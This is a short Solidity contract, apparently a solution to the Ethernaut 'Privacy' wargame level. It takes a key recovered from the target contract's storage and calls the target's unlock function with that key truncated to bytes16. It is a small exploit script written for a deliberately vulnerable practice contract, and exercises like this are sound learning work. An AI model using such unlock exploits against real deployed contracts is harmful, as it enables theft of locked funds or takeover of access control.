// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {
    bytes32 key;
    Privacy target;

    constructor(address _target, bytes32 _key) {
        target = Privacy(_target);
        key = _key;
    }

    function attack() public {
        target.unlock(bytes16(key));
    }
}
